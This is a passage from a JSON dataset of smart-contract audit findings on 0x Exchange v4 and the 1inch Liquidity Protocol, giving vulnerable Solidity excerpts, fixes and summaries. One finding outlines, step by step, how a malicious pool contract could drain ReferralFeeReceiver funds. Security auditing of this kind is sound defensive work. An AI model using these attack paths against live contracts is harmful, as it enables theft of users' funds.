metatransactions feature could then refund exactly `msg.value - <consumed ether>`. The transaction should be reverted if this fails because it means ether went missing during the transaction.\n\n\nWe also recommend limiting `sellToLiquidityProvider()` to only transfer up to `msg.value`. This is a form of defense in depth in case other vectors for a similar attack exist.",
      "summary": "\nThis bug report is about a vulnerability in the 0xProject protocol where an attacker can steal ether from the exchange proxy. This vulnerability exists when no check is made at the end of the transaction to revert if ether goes missing, reentrancy is possible during the transaction, and a mechanism exists to spend ether held by the exchange proxy. The bug report provides an example of how an attacker can exploit this vulnerability and recommends making a strict accounting of ether throughout the system. It also suggests limiting the 'sellToLiquidityProvider()' to only transfer up to 'msg.value' to provide defense in depth.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x Exchange v4",
      "source_link": "https://consensys.net/diligence/audits/2020/12/0x-exchange-v4/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Nicholas Ward",
        "Steve Marx"
      ]
    },
    {
      "id": "13574",
      "title": "The owner can borrow token0/token1 in the rescueFunds",
      "impact": "LOW",
      "content": "#### Description\n\n\nIf some random tokens/funds are accidentally transferred to the pool, the `owner` can call the `rescueFunds` function to withdraw any funds manually:\n\n\n**code/contracts/Mooniswap.sol:L331-L340**\n\n\n\n```\nfunction rescueFunds(IERC20 token, uint256 amount) external nonReentrant onlyOwner {\n    uint256 balance0 = token0.uniBalanceOf(address(this));\n    uint256 balance1 = token1.uniBalanceOf(address(this));\n\n    token.uniTransfer(msg.sender, amount);\n\n    require(token0.uniBalanceOf(address(this)) >= balance0, \"Mooniswap: access denied\");\n    require(token1.uniBalanceOf(address(this)) >= balance1, \"Mooniswap: access denied\");\n    require(balanceOf(address(this)) >= \\_BASE\\_SUPPLY, \"Mooniswap: access denied\");\n}\n\n```\nTheres no restriction on which funds the `owner` can try to withdraw and which token to call. Its theoretically possible to transfer pool tokens and then return them to the contract (e.g. in the case of ERC-777). That action would be similar to a free flash loan.\n\n\n#### Recommendation\n\n\nExplicitly check that the `token` is not equal to any of the pool tokens.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13573",
      "title": "Unpredictable behavior for users due to admin front running or general bad timing",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nIn a number of cases, administrators of contracts can update or upgrade things in the system without warning. This has the potential to violate a security goal of the system.\n\n\nSpecifically, privileged roles could use front running to make malicious changes just ahead of incoming transactions, or purely accidental negative effects could occur due to the unfortunate timing of changes.\n\n\nIn general users of the system should have assurances about the behavior of the action theyre about to take.\n\n\n#### Examples\n\n\n##### MooniswapFactoryGovernance - Admin opportunity to lock `swapFor` with a referral when setting an invalid `referralFeeReceiver`\n\n\n* `setReferralFeeReceiver` and `setGovernanceFeeReceiver` takes effect immediately.\n\n\n**code/contracts/governance/MooniswapFactoryGovernance.sol:L92-L95**\n\n\n\n```\nfunction setReferralFeeReceiver(address newReferralFeeReceiver) external onlyOwner {\n    referralFeeReceiver = newReferralFeeReceiver;\n    emit ReferralFeeReceiverUpdate(newReferralFeeReceiver);\n}\n\n```\n* `setReferralFeeReceiver` can be used to set an invalid receiver address (or one that reverts on every call) effectively rendering `Mooniswap.swapFor` unusable if a referral was specified in the swap.\n\n\n**code/contracts/Mooniswap.sol:L281-L286**\n\n\n\n```\nif (referral != address(0)) {\n    referralShare = invIncrease.mul(referralShare).div(\\_FEE\\_DENOMINATOR);\n    if (referralShare > 0) {\n        if (referralFeeReceiver != address(0)) {\n            \\_mint(referralFeeReceiver, referralShare);\n            IReferralFeeReceiver(referralFeeReceiver).updateReward(referral, referralShare);\n\n```\n##### Locking staked token\n\n\nAt any point in time and without prior notice to users an admin may accidentally or intentionally add a broken governance sub-module to the system that blocks all users from unstaking their `1INCH` token. An admin can recover from this by removing the broken sub-module, however, with malicious intent tokens may be locked forever.\n\n\nSince `1INCH` token gives voting power in the system, tokens are considered to hold value for other users and may be traded on exchanges. This raises concerns if tokens can be locked in a contract by one actor.\n\n\n* An admin adds an invalid address or a malicious sub-module to the governance contract that always `reverts` on calls to `notifyStakeChanged`.\n\n\n**code/contracts/inch/GovernanceMothership.sol:L63-L66**\n\n\n\n```\nfunction addModule(address module) external onlyOwner {\n    require(\\_modules.add(module), \"Module already registered\");\n    emit AddModule(module);\n}\n\n```\n**code/contracts/inch/GovernanceMothership.sol:L73-L78**\n\n\n\n```\nfunction \\_notifyFor(address account, uint256 balance) private {\n    uint256 modulesLength = \\_modules.length();\n    for (uint256 i = 0; i < modulesLength; ++i) {\n        IGovernanceModule(\\_modules.at(i)).notifyStakeChanged(account, balance);\n    }\n}\n\n```\n##### Admin front-running to prevent user stake sync\n\n\nAn admin may front-run users while staking in an attempt to prevent submodules from being notified of the stake update. This is unlikely to happen as it incurs costs for the attacker (front-back-running) to normal users but may be an interesting attack scenario to exclude a whales stake from voting.\n\n\nFor example, an admin may front-run `stake()` or `notoify*()` by briefly removing all governance submodules from the mothership and re-adding them after the users call succeeded. The stake-update will not be propagated to the sub-modules. A user may only detect this when they are voting (if they had no stake before) or when they actually check their stake. Such an attack might likely stay unnoticed unless someone listens for `addmodule` `removemodule` events on the contract.\n\n\n* An admin front-runs a transaction by removing all modules and re-adding them afterwards to prevent the stake from propagating to the submodules.\n\n\n**code/contracts/inch/GovernanceMothership.sol:L68-L71**\n\n\n\n```\nfunction removeModule(address module) external onlyOwner {\n    require(\\_modules.remove(module), \"Module was not registered\");\n    emit RemoveModule(module);\n}\n\n```\n##### Admin front-running to prevent unstake from propagating\n\n\nAn admin may choose to front-run their own `unstake()`, temporarily removing all governance sub-modules, preventing `unstake()` from syncing the action to sub-modules while still getting their previously staked tokens out. The governance sub-modules can be re-added right after unstaking. Due to double-accounting of the stake (in governance and in every sub-module) their stake will still be exercisable in the sub-module even though it was removed from the mothership. Users can only prevent this by manually calling a state-sync on the affected account(s).\n\n\n#### Recommendation\n\n\nThe underlying issue is that users of the system cant be sure what the behavior of a function call will be, and this is because the behavior can change at any time.\n\n\nWe recommend giving the user advance notice of changes with a time lock. For example, make all system-parameter and upgrades require two steps with a mandatory time window between them. The first step merely broadcasts to users that a particular change is coming, and the second step commits that change after a suitable waiting period. This allows users that do not accept the change to withdraw immediately.\n\n\nFurthermore, users should be guaranteed to be able to redeem their staked tokens. An entity - even though trusted - in the system should not be able to lock tokens indefinitely.",
      "summary": "\nThis bug report describes a security vulnerability in a system that allows privileged roles to make malicious changes just ahead of incoming transactions, or purely accidental negative effects to occur due to the unfortunate timing of changes. The report provides three examples of how this vulnerability can be exploited: by locking a user's staked token, by front-running a transaction to prevent stake sync, and by front-running an unstake to prevent it from propagating. The report recommends giving users advance notice of changes with a two-step process, including a mandatory time window between them, so that users can withdraw if they do not accept the change. Additionally, users should be guaranteed to be able to redeem their staked tokens, and no entity in the system should be able to lock them indefinitely.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13572",
      "title": "MooniswapGovernance - _beforeTokenTransfer should not update voting power on transfers to self Fix Unverified",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed [1inch-exchange/[emailprotected]`7c7126d`](https://github.com/1inch-exchange/1inch-liquidity-protocol/commit/7c7126de7f8be0aa1fcbb1c8324a84c997f0bcbb)\n\n\n(This fix is as reported by the developer team, but has not been verified by Diligence).\n\n\n\n\n#### Description\n\n\nMooniswap governance is based on the liquidity voting system that is also employed by the mothership or for factory governance. In contrast to traditional voting systems where users vote for discrete values, the liquidity voting system derives a continuous weighted averaged consensus value from all the votes. Thus it is required that whenever stake changes in the system, all the parameters that can be voted upon are updated with the new weights for a specific user.\n\n\nThe Mooniswap pool is governed by liquidity providers and liquidity tokens are the stake that gives voting rights in `MooniswapGovernance`. Thus whenever liquidity tokens are transferred to another address, stake and voting values need to be updated. This is handled by `MooniswapGovernance._beforeTokenTransfer()`.\n\n\nIn the special case where someone triggers a token transfer where the `from` address equals the `to` address, effectively sending the token to themselves, no update on voting power should be performed. Instead, voting power is first updated with `balance - amount` and then with `balance + amount` which in the worst case means it is updating first to a zero balance and then to 2x the balance.\n\n\nUltimately this should not have an effect on the overall outcome but is unnecessary and wasting gas.\n\n\n#### Examples\n\n\n* `beforeTokenTransfer` callback in `Mooniswap` does not check for the NOP case where `from==to`\n\n\n**code/contracts/governance/MooniswapGovernance.sol:L100-L119**\n\n\n\n```\nfunction \\_beforeTokenTransfer(address from, address to, uint256 amount) internal override {\n    uint256 balanceFrom = (from != address(0)) ? balanceOf(from) : 0;\n    uint256 balanceTo = (from != address(0)) ? balanceOf(to) : 0;\n    uint256 newTotalSupply = totalSupply()\n        .add(from == address(0) ? amount : 0)\n        .sub(to == address(0) ? amount : 0);\n\n    ParamsHelper memory params = ParamsHelper({\n        from: from,\n        to: to,\n        amount: amount,\n        balanceFrom: balanceFrom,\n        balanceTo: balanceTo,\n        newTotalSupply: newTotalSupply\n    });\n\n    \\_updateOnTransfer(params, mooniswapFactoryGovernance.defaultFee, \\_emitFeeVoteUpdate, \\_fee);\n    \\_updateOnTransfer(params, mooniswapFactoryGovernance.defaultSlippageFee, \\_emitSlippageFeeVoteUpdate, \\_slippageFee);\n    \\_updateOnTransfer(params, mooniswapFactoryGovernance.defaultDecayPeriod, \\_emitDecayPeriodVoteUpdate, \\_decayPeriod);\n}\n\n```\n* which leads to `updateBalance` being called on the same address twice, first with `currentBalance - amountTransferred` and then with `currentBalance + amountTransferred`.\n\n\n**code/contracts/governance/MooniswapGovernance.sol:L147-L153**\n\n\n\n```\nif (params.from != address(0)) {\n    votingData.updateBalance(params.from, voteFrom, params.balanceFrom, params.balanceFrom.sub(params.amount), params.newTotalSupply, defaultValue, emitEvent);\n}\n\nif (params.to != address(0)) {\n    votingData.updateBalance(params.to, voteTo, params.balanceTo, params.balanceTo.add(params.amount), params.newTotalSupply, defaultValue, emitEvent);\n}\n\n```\n#### Recommendation\n\n\nDo not update voting power on LP token transfers where `from == to`.",
      "summary": "\nA bug was reported in the Mooniswap governance system, which is based on the liquidity voting system. This system derives a continuous weighted averaged consensus value from all the votes. When liquidity tokens are transferred to another address, stake and voting values need to be updated. This is handled by the `MooniswapGovernance._beforeTokenTransfer()` function.\n\nHowever, in the special case where someone triggers a token transfer where the `from` address equals the `to` address, effectively sending the token to themselves, the `beforeTokenTransfer` callback does not check for this and updates voting power first with `balance - amount` and then with `balance + amount`, which is unnecessary and wastes gas.\n\nTo fix this issue, the developer team added [1inch-exchange/[emailprotected]`7c7126d`](https://github.com/1inch-exchange/1inch-liquidity-protocol/commit/7c7126de7f8be0aa1fcbb1c8324a84c997f0bcbb) to the code, although this has not been verified by Diligence. The recommendation is to not update voting power on LP token transfers where `from == to`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13571",
      "title": "MooniswapGovernance - votingpower is not accurately reflected when minting pool tokens Fix Unverified",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAccording to the client, this issue is addressed in [1inch-exchange/[emailprotected]`eb869fd`](https://github.com/1inch-exchange/1inch-liquidity-protocol/commit/eb869fdd2cfdc186408d95abb756105a7ea60c22)\n\n\n(This fix is as reported by the developer team, but has not been verified by Diligence).\n\n\n\n\n#### Description\n\n\nWhen a user provides liquidity to the pool, pool-tokens are minted. The minting event triggers the `_beforeTokenTransfer` callback in `MooniswapGovernance` which updates voting power reflecting the newly minted stake for the user.\n\n\nThere seems to be a copy-paste error in the way `balanceTo` is determined that sets `balanceTo` to zero if new token were minted (`from==address(0)`). This means, that in a later call to `_updateOnTransfer` only the newly minted amount is considered when adjusting voting power.\n\n\n#### Examples\n\n\n* If tokens are newly minted `from==address(0)` and therefore `balanceTo -> 0`.\n\n\n**code/contracts/governance/MooniswapGovernance.sol:L100-L114**\n\n\n\n```\nfunction \\_beforeTokenTransfer(address from, address to, uint256 amount) internal override {\n    uint256 balanceFrom = (from != address(0)) ? balanceOf(from) : 0;\n    uint256 balanceTo = (from != address(0)) ? balanceOf(to) : 0;\n    uint256 newTotalSupply = totalSupply()\n        .add(from == address(0) ? amount : 0)\n        .sub(to == address(0) ? amount : 0);\n\n    ParamsHelper memory params = ParamsHelper({\n        from: from,\n        to: to,\n        amount: amount,\n        balanceFrom: balanceFrom,\n        balanceTo: balanceTo,\n        newTotalSupply: newTotalSupply\n    });\n\n```\n* now, `balanceTo` is zero which would adjust voting power to `amount` instead of the users actual balance + the newly minted token.\n\n\n**code/contracts/governance/MooniswapGovernance.sol:L150-L153**\n\n\n\n```\n\nif (params.to != address(0)) {\n    votingData.updateBalance(params.to, voteTo, params.balanceTo, params.balanceTo.add(params.amount), params.newTotalSupply, defaultValue, emitEvent);\n}\n\n```\n#### Recommendation\n\n\n`balanceTo` should be zero when burning (`to == address(0)`) and `balanceOf(to)` when minting.\n\n\ne.g. like this:\n\n\n\n```\nuint256 balanceTo = (to != address(0)) ? balanceOf(to) : 0;\n\n```",
      "summary": "\nThis bug report is about an issue with the MooniswapGovernance contract when a user provides liquidity to the pool. The issue is that the minting event triggers the `_beforeTokenTransfer` callback in `MooniswapGovernance` which updates voting power reflecting the newly minted stake for the user. The bug is caused by a copy-paste error in the way `balanceTo` is determined, which sets `balanceTo` to zero if new token were minted (`from==address(0)`). This results in only the newly minted amount being considered when adjusting voting power. The developer team has proposed a fix, which is to set `balanceTo` to zero when burning (`to == address(0)`) and `balanceOf(to)` when minting. This fix has not been verified yet by Diligence.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13570",
      "title": "The uniTransferFrom function can potentially be used with invalid params Fix Unverified",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAccording to the client, this issue is addressed in [1inch-exchange/[emailprotected]`d0ffb6f`](https://github.com/1inch-exchange/1inch-liquidity-protocol/commit/d0ffb6f4a1cf3db9a7d8266cbe245ada6cfc1886).\n\n\n(This fix is as reported by the developer team, but has not been verified by Diligence).\n\n\n\n\n#### Description\n\n\nThe system is using the `UniERC20` contract to incapsulate transfers of both ERC-20 tokens and ETH. This contract has `uniTransferFrom` function that can be used for any ERC-20 or ETH:\n\n\n**code/contracts/libraries/UniERC20.sol:L36-L48**\n\n\n\n```\nfunction uniTransferFrom(IERC20 token, address payable from, address to, uint256 amount) internal {\n    if (amount > 0) {\n        if (isETH(token)) {\n            require(msg.value >= amount, \"UniERC20: not enough value\");\n            if (msg.value > amount) {\n                // Return remainder if exist\n                from.transfer(msg.value.sub(amount));\n            }\n        } else {\n            token.safeTransferFrom(from, to, amount);\n        }\n    }\n}\n\n```\nIn case if the function is called for the normal ERC-20 token, everything works as expected. The tokens are transferred from the `from` address to the `to` address. If the token is ETH - the transfer is expected to be from the `msg.sender` to `this` contract. Even if the `to` and `from` parameters are different.\n\n\nThis issues severity is not high because the function is always called with the proper parameters in the current codebase.\n\n\n#### Recommendation\n\n\nMake sure that the `uniTransferFrom` function is always called with expected parameters.",
      "summary": "\nThis bug report concerns the `UniERC20` contract, which is used to incapsulate transfers of both ERC-20 tokens and ETH. The contract has a `uniTransferFrom` function which can be used for any ERC-20 or ETH. When the function is called for a normal ERC-20 token, everything works as expected. However, when the token is ETH, the transfer is expected to be from the `msg.sender` to `this` contract, even if the `to` and `from` parameters are different. The developer team has reported a fix for this issue, but it has not been verified yet. \n\nTo address this issue, it is recommended that the `uniTransferFrom` function is always called with the expected parameters. The severity of this issue is not high, as the function is always called with the proper parameters in the current codebase.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13569",
      "title": "Users can increase their voting power by voting for the max/min values",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nMany parameters in the system are determined by the complicated governance mechanism. These parameters are calculated as a result of the voting process and are equal to the weighted average of all the votes that stakeholders make. The idea is that every user is voting for the desired value. But if the result value is smaller (larger) than the desired, the user can change the vote for the max (min) possible value. That would shift the result towards the desired one and basically increase this stakeholders voting power. So every user is more incentivized to vote for the min/max value than for the desired one.\n\n\nThe issues severity is not high because all parameters have reasonable max value limitations, so its hard to manipulate the system too much.\n\n\n#### Recommendation\n\n\nReconsider the voting mechanism.",
      "summary": "\nThis bug report is about the governance mechanism of a system, which determines parameters based on the weighted average of all votes that stakeholders make. The issue is that users are incentivized to vote for the max or min value instead of their desired value, which could lead to manipulation of the system. However, the severity of the issue is not high since the parameters have max value limitations. The recommendation is to reconsider the voting mechanism.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13568",
      "title": "GovernanceMothership - notifyFor allows to arbitrarily create new or override other users stake in governance modules Fix Unverified",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAccording to the client, this issue is addressed in [1inch-exchange/[emailprotected]`2ce549d`](https://github.com/1inch-exchange/1inch-liquidity-protocol/commit/2ce549dce0be49fc6eee1273a35fbcad4f2a8fbc) and added tests with [1inch-exchange/[emailprotected]`e0dc46b`](https://github.com/1inch-exchange/1inch-liquidity-protocol/commit/e0dc46ba8db7a2fc9fd26706a253185f6171a700)\n\n\n(This fix is as reported by the developer team, but has not been verified by Diligence).\n\n\n\n\n#### Description\n\n\nThe `notify*` methods are called to update linked governance modules when an accounts stake changes in the Mothership. The linked modules then update their own balances of the user to accurately reflect the accounts real stake in the Mothership.\n\n\nBesides `notify` theres also a method named `notifyFor` which is publicly accessible. It is assumed that the method should be used similar to `notify` to force an update for another accounts balance.\n\n\nHowever, invoking the method forces an update in the linked modules for the provided address, **but takes `balanceOf(msg.sender)`** instead of `balanceOf(account)`. This allows malicious actors to:\n\n\n* Arbitrarily change other accounts stake in linked governance modules (e.g. zeroing stake, increasing stake) based on the callers stake in the mothership\n* Duplicate stake out of thin air to arbitrary addresses (e.g. staking in mothership once and calling `notifyFor` many other account addresses)\n\n\n#### Examples\n\n\n* publicly accessible method allows forcing stake updates for arbitrary users\n\n\n**code/contracts/inch/GovernanceMothership.sol:L48-L50**\n\n\n\n```\nfunction notifyFor(address account) external {\n    \\_notifyFor(account, balanceOf(msg.sender));\n}\n\n```\n* the method calls the linked governance modules\n\n\n**code/contracts/inch/GovernanceMothership.sol:L73-L78**\n\n\n\n```\nfunction \\_notifyFor(address account, uint256 balance) private {\n    uint256 modulesLength = \\_modules.length();\n    for (uint256 i = 0; i < modulesLength; ++i) {\n        IGovernanceModule(\\_modules.at(i)).notifyStakeChanged(account, balance);\n    }\n}\n\n```\n* which will arbitrarily `mint` or `burn` stake in the `BalanceAccounting` of `Factory` or `Reward` (or other linked governance modules)\n\n\n**code/contracts/governance/BaseGovernanceModule.sol:L29-L31**\n\n\n\n```\nfunction notifyStakeChanged(address account, uint256 newBalance) external override onlyMothership {\n    \\_notifyStakeChanged(account, newBalance);\n}\n\n```\n**code/contracts/governance/MooniswapFactoryGovernance.sol:L144-L160**\n\n\n\n```\nfunction \\_notifyStakeChanged(address account, uint256 newBalance) internal override {\n    uint256 balance = balanceOf(account);\n    if (newBalance > balance) {\n        \\_mint(account, newBalance.sub(balance));\n    } else if (newBalance < balance) {\n        \\_burn(account, balance.sub(newBalance));\n    } else {\n        return;\n    }\n    uint256 newTotalSupply = totalSupply();\n\n    \\_defaultFee.updateBalance(account, \\_defaultFee.votes[account], balance, newBalance, newTotalSupply, \\_DEFAULT\\_FEE, \\_emitDefaultFeeVoteUpdate);\n    \\_defaultSlippageFee.updateBalance(account, \\_defaultSlippageFee.votes[account], balance, newBalance, newTotalSupply, \\_DEFAULT\\_SLIPPAGE\\_FEE, \\_emitDefaultSlippageFeeVoteUpdate);\n    \\_defaultDecayPeriod.updateBalance(account, \\_defaultDecayPeriod.votes[account], balance, newBalance, newTotalSupply, \\_DEFAULT\\_DECAY\\_PERIOD, \\_emitDefaultDecayPeriodVoteUpdate);\n    \\_referralShare.updateBalance(account, \\_referralShare.votes[account], balance, newBalance, newTotalSupply, \\_DEFAULT\\_REFERRAL\\_SHARE, \\_emitReferralShareVoteUpdate);\n    \\_governanceShare.updateBalance(account, \\_governanceShare.votes[account], balance, newBalance, newTotalSupply, \\_DEFAULT\\_GOVERNANCE\\_SHARE, \\_emitGovernanceShareVoteUpdate);\n}\n\n```\n**code/contracts/governance/GovernanceRewards.sol:L72-L79**\n\n\n\n```\nfunction \\_notifyStakeChanged(address account, uint256 newBalance) internal override updateReward(account) {\n    uint256 balance = balanceOf(account);\n    if (newBalance > balance) {\n        \\_mint(account, newBalance.sub(balance));\n    } else if (newBalance < balance) {\n        \\_burn(account, balance.sub(newBalance));\n    }\n}\n\n```\n#### Recommendation\n\n\nRemove `notifyFor` or change it to take the balance of the correct account `_notifyFor(account, balanceOf(msg.sender))`.\n\n\nIt is questionable whether the public `notify*()` family of methods is actually needed as stake should only change - and thus an update of linked modules should only be required - if an account calls `stake()` or `unstake()`. It should therefore be considered to remove `notify()`, `notifyFor` and `batchNotifyFor`.",
      "summary": "\nA bug report has been filed for the 1inch Liquidity Protocol, which is a decentralized exchange aggregator. The bug is related to the `notify*` methods of the Mothership, which are called to update linked governance modules when an accounts stake changes. It is assumed that the method should be used similar to `notify` to force an update for another accounts balance. However, this method takes `balanceOf(msg.sender)` instead of `balanceOf(account)`, which allows malicious actors to arbitrarily change other accounts stake in linked governance modules, such as zeroing stake, increasing stake, and duplicating stake out of thin air to arbitrary addresses.\n\nThe developer team has identified the resolution for this bug, which is to remove `notifyFor` or change it to take the balance of the correct account `_notifyFor(account, balanceOf(msg.sender))`. It is also recommended that the public `notify*()` family of methods be removed, as stake should only change if an account calls `stake()` or `unstake()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "1inch Liquidity Protocol",
      "source_link": "https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13567",
      "title": "[Out of Scope] ReferralFeeReceiver - anyone can steal all the funds that belong to ReferralFeeReceiver Fix Unverified",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAccording to the client, this issue is addressed in [1inch-exchange/1inch-liquidity-protocol#2](https://github.com/1inch-exchange/1inch-liquidity-protocol/pull/2) and the reentrancy in `FeeReceiver` in [1inch-exchange/[emailprotected]`e9c6a03`](https://github.com/1inch-exchange/1inch-liquidity-protocol/commit/e9c6a03ab28f1c486ed73c92a30d5a283aed2014)\n\n\n(This fix is as reported by the developer team, but has not been verified by Diligence).\n\n\n\n\n#### Description\n\n\n**Note**: *This issue was raised in components that were being affected by the scope reduction as outlined in the section Scope and are, therefore, only shallowly validated. Nevertheless, we find it important to communicate such potential findings and ask the client to further investigate.*\n\n\nThe `ReferralFeeReceiver` receives pool shares when users `swap()` tokens in the pool. A `ReferralFeeReceiver` may be used with multiple pools and, therefore, be a lucrative target as it is holding pool shares.\n\n\nAny token or `ETH` that belongs to the `ReferralFeeReceiver` is at risk and can be drained by any user by providing a custom `mooniswap` pool contract that references existing token holdings.\n\n\nIt should be noted that none of the functions in `ReferralFeeReceiver` verify that the user-provided `mooniswap` pool address was actually deployed by the linked `MooniswapFactory`. The factory provides certain security guarantees about mooniswap pool contracts (e.g. valid mooniswap contract, token deduplication, tokenA!=tokenB, enforced token sorting, ), however, since the `ReferralFeeReceiver` does not verify the user-provided `mooniswap` address they are left unchecked.\n\n\n##### Additional Notes\n\n\n* `freezeEpoch` - (callable by anyone) performs a `pool.withdraw()` with the `minAmounts` check being disabled. This may allow someone to call this function at a time where the contract actually gets a bad deal.\n* `trade` - (callable by anyone) can intentionally be used to perform bad trades (front-runnable)\n* `trade` - (callable by anyone) appears to implement inconsistent behavior when sending out `availableBalance`. `ETH` is sent to `tx.origin` (the caller) while tokens are sent to the user-provided `mooniswap` address.\n\n\n**code/contracts/ReferralFeeReceiver.sol:L91-L95**\n\n\n\n```\nif (path[0].isETH()) {\n    tx.origin.transfer(availableBalance);  // solhint-disable-line avoid-tx-origin\n} else {\n    path[0].safeTransfer(address(mooniswap), availableBalance);\n}\n\n```\n* multiple methods - since `mooniswap` is a user-provided address there are a lot of opportunities to reenter the contract. Consider adding reentrancy guards as another security layer (e.g. `claimCurrentEpoch` and others).\n* multiple methods - do not validate the amount of tokens that are returned, causing an evm assertion due to out of bounds index access.\n\n\n**code/contracts/ReferralFeeReceiver.sol:L57-L59**\n\n\n\n```\nIERC20[] memory tokens = mooniswap.getTokens();\nuint256 token0Balance = tokens[0].uniBalanceOf(address(this));\nuint256 token1Balance = tokens[1].uniBalanceOf(address(this));\n\n```\n* in `GovernanceFeeReceiver` anyone can intentionally force unwrapping of pool tokens or perform swaps in the worst time possible. e.g. The checks for `withdraw(..., minAmounts)` is disabled.\n\n\n**code/contracts/governance/GovernanceFeeReceiver.sol:L18-L26**\n\n\n\n```\nfunction unwrapLPTokens(Mooniswap mooniswap) external validSpread(mooniswap) {\n    mooniswap.withdraw(mooniswap.balanceOf(address(this)), new uint256[](0));\n}\n\nfunction swap(IERC20[] memory path) external validPath(path) {\n    (uint256 amount,) = \\_maxAmountForSwap(path, path[0].uniBalanceOf(address(this)));\n    uint256 result = \\_swap(path, amount, payable(address(rewards)));\n    rewards.notifyRewardAmount(result);\n}\n\n```\n#### Examples\n\n\nA malicious user can drain all token by calling `claimFrozenEpoch` with a custom contract as `mooniswap` that returns a token address the `ReferralFeeReceiver` contracts holds token from in `IERC20[] memory tokens = mooniswap.getTokens();`. A subsequent call to `_transferTokenShare()` will then send out any amount of token requested by the attacker to the attacker-controlled address (`msg.sender`).\n\n\nLets assume the following scenario:\n\n\n* `ReferralFeeReceiver` holds `DAI` token and we want to steal them.\n\n\nAn attacker may be able to drain the contract from `DAI` token via `claimFrozenToken` if\n\n\n* they control the `mooniswap` address argument and provide a malicious contract\n* `user.share[mooniswap][firstUnprocessedEpoch] > 0` - this can be arbitrarily set in `updateReward`\n* `token.epochBalance[currentEpoch].token0Balance > 0` - this can be manipulated in `freezeEpoch` by providing a malicious `mooniswap` contract\n* they own a worthless `ERC20` token e.g. named `ATTK`\n\n\nThe following steps outline the attack:\n\n\n1. The attacker calls into `updateReward` to set `user.share[mooniswap][currentEpoch]` to a value that is greater than zero to make sure that `share` in `claimFrozenEpoch` takes the `_transferTokenShare` path.\n\n\n**code/contracts/ReferralFeeReceiver.sol:L38-L50**\n\n\n\n```\nfunction updateReward(address referral, uint256 amount) external override {\n    Mooniswap mooniswap = Mooniswap(msg.sender);\n    TokenInfo storage token = tokenInfo[mooniswap];\n    UserInfo storage user = userInfo[referral];\n    uint256 currentEpoch = token.currentEpoch;\n\n    // Add new reward to current epoch\n    user.share[mooniswap][currentEpoch] = user.share[mooniswap][currentEpoch].add(amount);\n    token.epochBalance[currentEpoch].totalSupply = token.epochBalance[currentEpoch].totalSupply.add(amount);\n\n    // Collect all processed epochs and advance user token epoch\n    \\_collectProcessedEpochs(user, token, mooniswap, currentEpoch);\n}\n\n```\n2. The attacker then calls `freezeEpoch()` providing the malicious `mooniswap` contract address controlled by the attacker.\n\n\n* The malicious contract returns token that is controlled by the attacker (e.g. `ATTK`) in a call to `mooniswap.getTokens();`\n* The contract then stores the current balance of the attacker-controlled token in `token0Balance/token1Balance`. Note that the token being returned here by the malicious contract can be different from the one were checking out in the last step (balance manipulation via `ATTK`, checkout of `DAI` in the last step).\n* Then the contract calls out to the malicious `mooniswap` contract. This gives the malicious contract an easy opportunity to send some attacker-controlled token (`ATTK`) to the `ReferralFeeReceiver` in order to freely manipulate the frozen tokenbalances (`tokens[0].uniBalanceOf(address(this)).sub(token0Balance);`).\n* Note that the used token addresses are never stored anywhere. The balances recorded here are for an attacker-controlled token (`ATTK`), not the actual one that were about to steal (e.g. `DAI`)\n* The token balances are now set-up for checkout in the last step (`claimFrozenEpoch`).\n\n\n**code/contracts/ReferralFeeReceiver.sol:L52-L64**\n\n\n\n```\nfunction freezeEpoch(Mooniswap mooniswap) external validSpread(mooniswap) {\n    TokenInfo storage token = tokenInfo[mooniswap];\n    uint256 currentEpoch = token.currentEpoch;\n    require(token.firstUnprocessedEpoch == currentEpoch, \"Previous epoch is not finalized\");\n\n    IERC20[] memory tokens = mooniswap.getTokens();\n    uint256 token0Balance = tokens[0].uniBalanceOf(address(this));\n    uint256 token1Balance = tokens[1].uniBalanceOf(address(this));\n    mooniswap.withdraw(mooniswap.balanceOf(address(this)), new uint256[](0));\n    token.epochBalance[currentEpoch].token0Balance = tokens[0].uniBalanceOf(address(this)).sub(token0Balance);\n    